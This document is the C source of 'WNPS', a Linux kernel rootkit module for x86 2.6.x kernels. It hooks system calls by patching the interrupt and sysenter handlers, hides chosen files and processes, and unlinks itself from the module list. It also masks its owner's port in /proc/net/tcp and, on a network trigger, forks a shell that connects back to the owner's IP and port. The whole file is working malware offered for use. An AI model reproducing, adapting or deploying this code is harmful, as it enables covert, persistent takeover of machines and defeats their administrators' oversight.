/*
 * WNPS V 0.26 beta2 *Wnps is not poc shell*
 *
 * (C) 2007 wzt    http://www.xsec.org
 *
 * Linux rootkit for x86 2.6.x kernel
 *
 */

#ifndef __KERNEL__
#define __KERNEL__
#endif

#ifndef MODULE
#define MODULE
#endif

#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/kobject.h>
#include <linux/ip.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/list.h>
#include <linux/ptrace.h>
#include <linux/spinlock.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>
#include <linux/timer.h>
#include <linux/jiffies.h>
#include <net/tcp.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"
#include "hook.h"
#include "syscalls.h"
#include "host.h"

static inline my_syscall0(pid_t, fork);

asmlinkage long (*orig_getdents64)(unsigned int fd, struct dirent64 *dirp, unsigned int count);
asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t nbytes);
//asmlinkage ssize_t (*orig_write)(int fd,void *buf,size_t count);
int (*old_tcp4_seq_show)(struct seq_file *,void *);

asmlinkage long Sys_getdents64(unsigned int fd, struct dirent64 *dirp, unsigned int count);
asmlinkage ssize_t Sys_read(int fd, void *buf, size_t nbytes);
asmlinkage ssize_t Sys_write(int fd,void *buf,size_t count);
asmlinkage long Sys_chdir(const char __user *filename);
asmlinkage int Sys_kill(pid_t pid,int sig);
asmlinkage long Sys_ptrace(long request,long pid,long addr,long data);

/*
 * function in shell.c
 */
extern unsigned int hook_func(unsigned int hooknum,
                       struct sk_buff **skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int (*okfn)(struct sk_buff *));
                       
extern int netfilter_test_init(void);
extern void netfilter_test_exit(void);

extern int kshell(int ip,int port);
extern __u32 wnps_in_aton(const char *str);
extern struct nf_hook_ops nfho;

extern unsigned long myowner_port;
extern unsigned long myowner_ip;
extern unsigned int wztshell;
extern char connect_ip[20];

/*
 * function in klogger.c
 */
extern void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count);
extern void (*old_receive_buf)(struct tty_struct *,const unsigned char *,char *,int);

int hook_init(void);

static char read_buf[BUFF];

unsigned long sysenter;

//static struct timer_list my_timer;

void new_idt(void)
{
        ASMIDType
        (
                "cmp %0, %%eax      \n"
                "jae syscallmala        \n"
                "jmp hook               \n"

                "syscallmala:           \n"
                "jmp dire_exit          \n"

                : : "i" (NR_syscalls)
        );
}

void set_idt_handler(void *system_call)
{
        unsigned char *p;
        unsigned long *p2;

        p = (unsigned char *) system_call;
        while (!((*p == 0x0f) && (*(p+1) == 0x83)))
        p++;

        p -= 5;
        *p++ = 0x68;

        p2 = (unsigned long *) p;
        *p2++ = (unsigned long) ((void *) new_idt);

        p = (unsigned char *) p2;
        *p = 0xc3;

        while (!((*p == 0x0f) && (*(p+1) == 0x82)))
                p++;
        p -= 5;

        *p++ = 0x68;
        p2 = (unsigned long *) p;
        *p2++ = (unsigned long) ((void *) new_idt);

        p = (unsigned char *) p2;
        *p = 0xc3;
}

void set_sysenter_handler(void *sysenter)
{
        unsigned char *p;
        unsigned long *p2;

        p = (unsigned char *) sysenter;

        while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
                p++;

        while (!((*p == 0x0f) && (*(p+1) == 0x83)))
                p--;
        p -= 5;
        *p++ = 0x68;

        p2 = (unsigned long *) p;
        *p2++ = (unsigned long) ((void *) new_idt);

        p = (unsigned char *) p2;
        *p = 0xc3;
}

void hook(void)
{
        register int eax asm("eax");

        switch(eax)
        {
                case __NR_getdents64:
                        CallHookedSyscall(Sys_getdents64);
                        break;
                case __NR_read:
                        CallHookedSyscall(Sys_read);
        	       	break;
		/*
		case __NR_write:
			CallHookedSyscall(Sys_write);
			break;
		*/
                default:
                        JmPushRet(dire_call);
	               break;
    }

    JmPushRet( after_call );
}

/**
 * read_kallsyms - find sysenter address in /proc/kallsyms.
 *
 * success return the sysenter address,failed return 0.
 */
int read_kallsyms(void)
{
        mm_segment_t old_fs;
        ssize_t bytes;
        struct file *file = NULL;
        char *p,temp[20];
        int i = 0;

        file = filp_open(PROC_HOME,O_RDONLY,0);
        if (!file)
                return -1;

        if (!file->f_op->read)
                return -1;

        old_fs = get_fs();
        set_fs(get_ds());

        while((bytes = file->f_op->read(file,read_buf,BUFF,&file->f_pos))) {
                if (( p = strstr(read_buf,SYSENTER_ENTRY)) != NULL) {
                        while (*p--)
                                if (*p == '\n')
                                        break;

                        while (*p++ != ' ') {
                                temp[i++] = *p;
                        }
                        temp[--i] = '\0';
                        sysenter = simple_strtoul(temp,NULL,16);
			#if DEBUG == 1
                        printk("0x%8x\n",sysenter);
			#endif
			break;
                }
        }


        filp_close(file,NULL);

        return 0;
}

void *get_sysenter_entry(void)
{
        void *psysenter_entry = NULL;
        unsigned long v2;

        if (boot_cpu_has(X86_FEATURE_SEP))
	       rdmsr(MSR_IA32_SYSENTER_EIP, psysenter_entry, v2);
        else {
		#if DEBUG == 1
		printk("[+] serach sysenter_entry...");
		#endif
		read_kallsyms();
		if (sysenter == 0) {
			#if DEBUG == 1
			printk("[-] Wnps installed failed.\n");
			#endif
		}	
	       	return ((void *) sysenter);
	}

        return(psysenter_entry);
}

/**
 * serach the sys_call_table address.
 */
void *get_sct_addr(unsigned int system_call)
{
	unsigned char *p;
	unsigned long s_c_t;

	p = (unsigned char *) system_call;
	while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
		p++;

	dire_call = (unsigned long) p;

	p += 3;
	s_c_t = *((unsigned long *) p);

	p += 4;
	after_call = (unsigned long) p;

	while (*p != 0xfa)     /* cli */
		p++;

	dire_exit = (unsigned long) p;

	return((void *) s_c_t);
}

asmlinkage long Sys_getdents64(unsigned int fd, struct dirent64 *dirp, unsigned int count)
{
        struct dirent64 *td1, *td2;
        long ret, tmp;
        unsigned long hpid, nwarm;
        short int hide_process, hide_file;

        /* first we get the orig information */
        ret = (*orig_getdents64) (fd, dirp, count);
        if (!ret)
	       return ret;

        /* get some space in kernel */
        td2 = (struct dirent64 *) kmalloc(ret, GFP_KERNEL);
        if (!td2)
                return ret;
                
        /* copy the dirp struct to kernel space */
        __copy_from_user(td2, dirp, ret);

        td1 = td2, tmp = ret;
        while (tmp > 0) {
                tmp -= td1->d_reclen;
	        hide_file = 1;
	        hide_process = 0;
                hpid = 0;
                hpid = simple_strtoul(td1->d_name, NULL, 10);

                /* If we got a file like digital,it may be a task in the /proc.
                   So check the task with the task pid.
                */
                if (hpid != 0) {
                        struct task_struct *htask = current;
                        do  {
                                if(htask->pid == hpid)
                                        break;
                                else
                                        htask = next_task(htask);
			} while (htask != current);

                        /* we get the task which will be hide */
                        if ( ((htask->pid == hpid) && (strstr(htask->comm, HIDE_TASK) != NULL)))
                                hide_process = 1;
                }

                if ((hide_process) || (strstr(td1->d_name, HIDE_FILE) != NULL)) {
		        ret -= td1->d_reclen;
		        hide_file = 0;
		        /* we cover the task information */
                        if (tmp)
                                memmove(td1, (char *) td1 + td1->d_reclen, tmp);
	        }

                /* we hide the file */
	        if ((tmp) && (hide_file))
                        td1 = (struct dirent64 *) ((char *) td1 + td1->d_reclen);

	}

        nwarm = __copy_to_user((void *) dirp, (void *) td2, ret);
        kfree(td2);

        return ret;
}

asmlinkage ssize_t Sys_read(int fd, void *buf, size_t nbytes)
{
        ssize_t ret;

        /* we will start a shell */
        if (wztshell == 1) {
		#if DEBUG == 1
		printk(KERN_ALERT "[+] got my owner's packet.\n");
                #endif
		wztshell = 0;
                if (!fork())
		      kshell(myowner_ip,myowner_port);
        }

        ret = orig_read(fd,buf,nbytes);
        
	return ret;
}
/*
asmlinkage ssize_t Sys_write(int fd,void *buf,size_t count)
{
	char *replace =  "                       ";
	char *tmp_buf,*p;

	tmp_buf = (char *)kmalloc(READ_NUM,GFP_KERNEL);
	if (tmp_buf == NULL)
		return orig_write(fd,buf,count);

	copy_from_user(tmp_buf,buf,READ_NUM - 1);

	if (connect_ip[0] != 0 || connect_ip[0] != '\0') {
		if ((p = strstr(tmp_buf,connect_ip)) != NULL) {
//			spin_lock(&wnps_lock);
			strncpy(p,replace,strlen(replace));
//			spin_unlock(&wnps_lock);
			copy_to_user((void *)buf,(void *)tmp_buf,READ_NUM);
			kfree(tmp_buf);
			return count;
		}
	}
	
	kfree(tmp_buf);

	return orig_write(fd,buf,count);
}
*/

char *strnstr(const char *haystack,const char *needle,size_t n)
{
	char *s = strstr(haystack,needle);
	
	if (s == NULL)
		return NULL;
	if (s - haystack + strlen(needle) <= n)
		return s;
	else
		return NULL;
}

int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
{
        int retval=old_tcp4_seq_show(seq, v);

        char port[12];

        sprintf(port,"%04X",ntohs(myowner_port));

        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
                seq->count -= TMPSZ;

	return retval;   
}

int wnps_init(void)
{
	struct descriptor_idt *pIdt80;
	struct module *m = &__this_module;
        struct tcp_seq_afinfo *my_afinfo = NULL;
        struct proc_dir_entry *my_dir_entry = proc_net->subdir;

	if (m->init == wnps_init)
		list_del(&m->list);
		
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,11)
	kobject_unregister(&m->mkobj.kobj);
#elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
	kobject_unregister(&m->mkobj->kobj);
#endif
        __asm__ volatile ("sidt %0": "=m" (idt48));

        pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);

        system_call_addr = (pIdt80->offset_high << 16 | pIdt80->offset_low);
	
	#if DEBUG == 1
        printk(KERN_ALERT "[+] system_call addr : 0x%8x\n",system_call_addr);
	#endif

        sys_call_table_addr = get_sct_addr(system_call_addr);

	#if DEBUG == 1
        printk(KERN_ALERT "[+] sys_call_table addr : 0x%8x\n",(unsigned int)sys_call_table_addr);
	#endif

        sys_call_table = (void **)sys_call_table_addr;
        
        sysenter_entry = get_sysenter_entry();

	wztshell = 0;

	atomic_set(&read_activo,0);

        orig_read = sys_call_table[__NR_read];
//	orig_write = sys_call_table[__NR_write];
        orig_getdents64 = sys_call_table[__NR_getdents64];

        set_idt_handler((void *)system_call_addr);
        set_sysenter_handler(sysenter_entry);
        
        while (strcmp(my_dir_entry->name, "tcp"))
                my_dir_entry = my_dir_entry->next;

        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
        {
                old_tcp4_seq_show = my_afinfo->seq_show;
                my_afinfo->seq_show = hacked_tcp4_seq_show;
        }
        
        netfilter_test_init();

	#if DEBUG == 1       
	printk(KERN_ALERT "[+] Wnps installed successfully!\n");
	#endif

        return 0;
}

void wnps_exit(void)
{
        /* 
	 * We do nothing here!
	 */
}

module_init(wnps_init);
module_exit(wnps_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wzt");

